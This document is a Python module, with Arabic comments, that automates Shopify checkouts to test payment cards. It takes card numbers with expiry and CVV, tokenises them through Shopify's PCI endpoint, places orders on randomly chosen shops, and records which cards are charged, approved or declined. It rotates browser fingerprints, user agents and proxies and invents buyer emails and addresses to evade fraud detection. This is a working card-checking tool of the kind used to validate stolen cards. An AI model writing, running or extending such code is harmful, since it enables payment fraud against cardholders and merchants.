from __future__ import annotations

import asyncio
import json
import re
import html
import random
import urllib.parse
import uuid

from curl_cffi.requests import AsyncSession

import importlib.util
from pathlib import Path

_here = Path(__file__).resolve().parent
_auto_path = _here / "auto.py"
if not _auto_path.is_file():
    _auto_path = _here.parent / "auto.py"
_spec = importlib.util.spec_from_file_location("shopify_auto", _auto_path)
_auto = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
_spec.loader.exec_module(_auto)

# ===== استورد الدوال الموجودة بس =====
CheckStatus = _auto.CheckStatus
CheckResult = _auto.CheckResult
Address = _auto.Address
BROWSER_PROFILES = _auto.BROWSER_PROFILES
USER_AGENTS = _auto.USER_AGENTS
generate_random_email = _auto.generate_random_email
address_for_country = _auto.address_for_country
parse_card_entry = _auto.parse_card_entry
normalize_proxy = _auto.normalize_proxy

# ===== دوال جديدة من auto.py =====
# خلينا نستوردهم من auto.py بعد ما نضيفهم
try:
    extract_stable_id = _auto.extract_stable_id
except:
    extract_stable_id = lambda x: ""

try:
    extract_queue_token_from_html = _auto.extract_queue_token_from_html
except:
    extract_queue_token_from_html = lambda x: ""

try:
    extract_identification_signature = _auto.extract_identification_signature
except:
    extract_identification_signature = lambda x: ""

# ===== دوال مش موجودة نعرفها هنا =====
def extract_commit_sha(html_content: str) -> str:
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html_content)
    return match.group(1) if match else ""

def extract_source_token(html_content: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', html_content)
    return html.unescape(match.group(1)).strip('"') if match else ""

def extract_private_access_token_id(html_content: str) -> str:
    unescaped = html.unescape(html_content)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def extract_actions_js_url(html_content: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', html_content)
    return shop_url + match.group(1) if match else ""

def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""

def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
        return seller.get('isShippingRequired', True)
    except:
        return True

def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
        de = seller.get('deliveryExpectations', {})
        de_typename = de.get('__typename', '')
        if de_typename == 'FilledDeliveryExpectationTerms':
            return [x['signedHandle'] for x in de.get('deliveryExpectations', []) if x.get('signedHandle')]
    except:
        pass
    return []

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_total(proposal_body: str) -> str:
    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {}).get('runningTotal', {}).get('value', {})
        return val.get('amount', "")
    except:
        return ""

def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {}).get('tax', {}).get('totalTaxAmount', {}).get('value', {})
        return val.get('amount', "0.0")
    except:
        return "0.0"

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""

def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CARD_DECLINED"
        return code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"

def extract_any_error(submit_body: str) -> str:
    patterns = [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = data.get('data', {}).get('submitForCompletion', {}).get('sellerProposal', {})
        return seller.get('tax', {}).get('totalTaxAmount', {}).get('value', {}).get('amount', "0.0")
    except:
        return "0.0"

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = data.get('data', {}).get('submitForCompletion', {}).get('sellerProposal', {})
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get('value', {}).get('amount')
            if val:
                return val
    except:
        pass
    return ""

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str,
                      impersonate: str = "chrome124", user_agent: str = "") -> Dict:
    return {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": user_agent or random.choice(USER_AGENTS),
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-source-id": source_token,
    }

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"', f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        payload = payload.replace('"presentmentCurrency": "USD",\n      "countryCode": "US"', f'"presentmentCurrency": "USD",\n      "countryCode": "{country}"')
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload

def check_submit_errors(status: int, body: str):
    if status != 200:
        match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
        if match:
            typename = match.group(1)
            if typename != "SubmitSuccess":
                errors = re.findall(r'"code"\s*:\s*"([^"]+)"', body)
                raise Exception(f"Submit failed with {typename}: {errors if errors else 'Unknown error'}")
        else:
            error_msg = extract_any_error(body)
            if error_msg:
                raise Exception(f"Submit error: {error_msg}")
            else:
                raise Exception(f"Submit returned non-200 status: {status}")

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

# ──────────────────────── Class AsyncTLSClient ──────────────────────

class AsyncTLSClient:
    def __init__(self, timeout=15, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url
        self.impersonate = impersonate or random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
        self.user_agent = user_agent or random.choice(USER_AGENTS)
        self._session: AsyncSession | None = None

    def _make_session(self) -> AsyncSession:
        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
        s.headers.update({
            'User-Agent': self.user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
        if self.proxy_url:
            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        await asyncio.sleep(random.uniform(0.01, 0.05))
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        await asyncio.sleep(random.uniform(0.01, 0.05))
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None

MAX_PRODUCT_PAGES = 1

# ──────────────────────── Find product fast ─────────────────────────

async def find_cheapest_product_fast(client: AsyncTLSClient, shop_url: str, min_price: float = 0.50):
    """جيب المنتج بسرعة (Async)"""
    try:
        resp = await client.get(f"{shop_url}/collections/all/products.json?limit=5")
        if resp.status_code == 200:
            data = resp.json()
            for p in data.get('products', []):
                for v in p.get('variants', []):
                    if v.get('available', False):
                        price = float(v.get('price', 0))
                        if price >= min_price:
                            return p.get('title', ''), str(p.get('id', '')), "", str(v.get('id', '')), v.get('price', '0')
    except:
        pass
    
    try:
        resp = await client.get(f"{shop_url}/products.json?limit=5&page=1")
        if resp.status_code == 200:
            data = resp.json()
            for p in data.get('products', []):
                for v in p.get('variants', []):
                    if v.get('available', False):
                        price = float(v.get('price', 0))
                        if price >= min_price:
                            return p.get('title', ''), str(p.get('id', '')), p.get('handle', ''), str(v.get('id', '')), v.get('price', '0')
    except:
        pass
    
    raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

# ──────────────────────── Get cart token ─────────────────────────────

async def get_cart_token_async(client: AsyncTLSClient, shop_url: str) -> str:
    try:
        resp = await client.get(f"{shop_url}/cart.js")
        if resp.status_code == 200:
            data = resp.json()
            return data.get('token', '')
    except:
        pass
    return ""

# ──────────────────────── Add to cart ────────────────────────────────

async def add_to_cart_js_async(client: AsyncTLSClient, shop_url: str, variant_id: str) -> bool:
    try:
        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {'id': variant_id, 'quantity': 1, 'form_type': 'product', 'utf8': '✓'}
        resp = await client.post(f"{shop_url}/cart/add.js", data=data, headers=headers)
        if resp.status_code == 200:
            return True
    except:
        pass
    return False

# ──────────────────────── Start checkout ────────────────────────────

async def start_checkout_fast_async(client: AsyncTLSClient, shop_url: str, cart_token: str = "") -> tuple:
    url = f"{shop_url}/cart"
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'cache-control': 'max-age=0',
        'origin': shop_url,
        'referer': f"{shop_url}/cart",
        'upgrade-insecure-requests': '1',
    }
    data = f'updates%5B%5D=1&checkout=&cart_token={cart_token or ""}'
    resp = await client.post(url, data=data, headers=headers, allow_redirects=True)
    
    checkout_url = str(resp.url)
    checkout_html = resp.text
    
    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    
    session_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', checkout_html)
    if not session_match:
        session_match = re.search(r'"sessionToken"\s*:\s*"(AAEB[^"]+)"', checkout_html)
    session_token = session_match.group(1) if session_match else ""
    
    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── PCI Tokenization ──────────────────────────

async def vault_card_async(client: AsyncTLSClient, card_number: str, month: str, year: str, cvv: str, 
                           name: str, signature: str = "", shop_domain: str = "") -> Optional[str]:
    try:
        url = "https://checkout.pci.shopifyinc.com/sessions"
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html',
            'user-agent': random.choice(USER_AGENTS),
        }
        if signature:
            headers['shopify-identification-signature'] = signature
        
        payload = {
            "credit_card": {
                "number": card_number,
                "month": int(month),
                "year": int(year),
                "verification_value": cvv,
                "start_month": None,
                "start_year": None,
                "issue_number": "",
                "name": name,
            },
            "payment_session_scope": shop_domain or "shopify.com"
        }
        
        resp = await client.post(url, json=payload, headers=headers)
        if resp.status_code in (200, 201):
            data = resp.json()
            return data.get('id')
    except:
        pass
    return None

# ──────────────────────── Submit for completion ──────────────────────

async def submit_for_completion_async(client: AsyncTLSClient, shop_url: str, checkout_url: str, 
                                      checkout_token: str, session_token: str, stable_id: str,
                                      queue_token: str, variant_id: str, vault_id: str,
                                      address: Address, email: str) -> Optional[str]:
    try:
        url = f"{shop_url}/checkouts/unstable/graphql"
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': shop_url,
            'referer': checkout_url,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': checkout_token,
            'user-agent': random.choice(USER_AGENTS),
        }
        
        attempt_token = f"{checkout_token}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}"
        
        mutation = """
        mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!) {
          submitForCompletion(input:$input attemptToken:$attemptToken) {
            ...on SubmitSuccess { receipt { id __typename } __typename }
            ...on SubmitAlreadyAccepted { receipt { id __typename } __typename }
            ...on SubmitFailed { reason __typename }
            ...on SubmitRejected { errors { code localizedMessage __typename } __typename }
            ...on Throttled { pollAfter queueToken __typename }
            ...on CheckpointDenied { redirectUrl __typename }
            ...on SubmittedForCompletion { receipt { id __typename } __typename }
          }
        }
        """
        
        payload = {
            "query": mutation,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "input": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": address.address1,
                                    "address2": address.address2,
                                    "city": address.city,
                                    "countryCode": address.country_code,
                                    "postalCode": address.postal_code,
                                    "firstName": address.first_name,
                                    "lastName": address.last_name,
                                    "zoneCode": address.zone_code,
                                    "phone": address.phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True}
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": "",
                                    "sessionId": vault_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": address.address1,
                                            "address2": address.address2,
                                            "city": address.city,
                                            "countryCode": address.country_code,
                                            "postalCode": address.postal_code,
                                            "firstName": address.first_name,
                                            "lastName": address.last_name,
                                            "zoneCode": address.zone_code,
                                            "phone": address.phone,
                                        }
                                    }
                                }
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address.address1,
                                "address2": address.address2,
                                "city": address.city,
                                "countryCode": address.country_code,
                                "postalCode": address.postal_code,
                                "firstName": address.first_name,
                                "lastName": address.last_name,
                                "zoneCode": address.zone_code,
                                "phone": address.phone,
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": address.country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": address.country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": address.country_code},
                        "rememberMe": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True}
                    },
                    "note": {"message": None, "customAttributes": []}
                }
            }
        }
        
        resp = await client.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            data = resp.json()
            submit = data.get('data', {}).get('submitForCompletion', {})
            receipt = submit.get('receipt', {})
            return receipt.get('id')
    except:
        pass
    return None

# ──────────────────────── Poll for receipt ──────────────────────────

async def poll_for_receipt_async(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                                 checkout_token: str, session_token: str, receipt_id: str) -> tuple:
    try:
        url = f"{shop_url}/checkouts/unstable/graphql"
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'referer': checkout_url,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-source-id': checkout_token,
            'user-agent': random.choice(USER_AGENTS),
        }
        
        query = """
        query PollForReceipt($receiptId:ID!,$sessionToken:String!) {
          receipt(receiptId:$receiptId, sessionInput:{sessionToken:$sessionToken}) {
            __typename
            ...on ProcessedReceipt { id token __typename }
            ...on ProcessingReceipt { id pollDelay __typename }
            ...on ActionRequiredReceipt { id __typename }
            ...on FailedReceipt { id processingError { code messageUntranslated __typename } __typename }
          }
        }
        """
        
        for attempt in range(10):
            payload = {
                "query": query,
                "operationName": "PollForReceipt",
                "variables": {
                    "receiptId": receipt_id,
                    "sessionToken": session_token
                }
            }
            
            resp = await client.post(url, json=payload, headers=headers)
            if resp.status_code == 200:
                data = resp.json()
                receipt = data.get('data', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt':
                    return ('CHARGED', 'ORDER_PLACED')
                elif typename == 'ActionRequiredReceipt':
                    return ('APPROVED', '3DS_AUTHENTICATION')
                elif typename == 'FailedReceipt':
                    error = receipt.get('processingError', {})
                    code = error.get('code', 'UNKNOWN')
                    return ('DECLINED', code)
                elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                    await asyncio.sleep(2)
                    continue
            
            await asyncio.sleep(1)
    except:
        pass
    
    return ('ERROR', 'POLL_TIMEOUT')

# ──────────────────────── Main function ─────────────────────────────

async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """الوظيفة الرئيسية للشيك (Async)"""
    
    if not shop_url:
        from auto import get_random_site
        shop_url = get_random_site()
        if not shop_url:
            result = CheckResult(card=card_entry, shop_url="", site_name="", currency="USD", status=CheckStatus.ERROR)
            result.error = Exception("No sites available")
            return result
    
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name, currency=currency, status=CheckStatus.ERROR)
    
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result
    
    email = generate_random_email()
    impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
    user_agent = random.choice(USER_AGENTS)
    
    client = AsyncTLSClient(timeout=15, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
    
    try:
        try:
            title, product_id, product_handle, variant_id, price = await find_cheapest_product_fast(client, shop_url)
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result
        
        cart_token = await get_cart_token_async(client, shop_url)
        
        if not await add_to_cart_js_async(client, shop_url, variant_id):
            try:
                from auto import add_to_cart_and_checkout_old
                # جرب الطريقة القديمة
            except:
                pass
        
        checkout_url, checkout_token, session_token, checkout_html = await start_checkout_fast_async(client, shop_url, cart_token)
        
        if not checkout_url or not session_token:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception("Failed to start checkout")
            return result
        
        stable_id = extract_stable_id(checkout_html)
        queue_token = extract_queue_token_from_html(checkout_html)
        signature = extract_identification_signature(checkout_html)
        
        if not stable_id:
            stable_id = str(uuid.uuid4())
        
        address = address_for_country(country)
        name = f"{address.first_name} {address.last_name}"
        shop_domain = urllib.parse.urlparse(shop_url).netloc
        
        vault_id = await vault_card_async(client, card_number, card_month, card_year, card_cvv, name, signature, shop_domain)
        if not vault_id:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception("Card vault failed")
            return result
        
        receipt_id = await submit_for_completion_async(client, shop_url, checkout_url, checkout_token,
                                                        session_token, stable_id, queue_token,
                                                        variant_id, vault_id, address, email)
        
        if not receipt_id:
            result.status = CheckStatus.DECLINED
            result.error = Exception("Submission rejected")
            return result
        
        status, status_code = await poll_for_receipt_async(client, shop_url, checkout_url, checkout_token,
                                                            session_token, receipt_id)
        
        if status == 'CHARGED':
            result.status = CheckStatus.CHARGED
            result.status_code = "ORDER_PLACED"
            result.amount = price
            result.receipt_url = checkout_url + "/thank_you"
        elif status == 'APPROVED':
            result.status = CheckStatus.APPROVED
            result.status_code = "3DS_AUTHENTICATION"
            result.amount = price
        elif status == 'DECLINED':
            result.status = CheckStatus.DECLINED
            result.status_code = status_code
            result.error = Exception(status_code)
        else:
            result.status = CheckStatus.ERROR
            result.error = Exception(status_code)
        
        return result
        
    finally:
        await client.close()
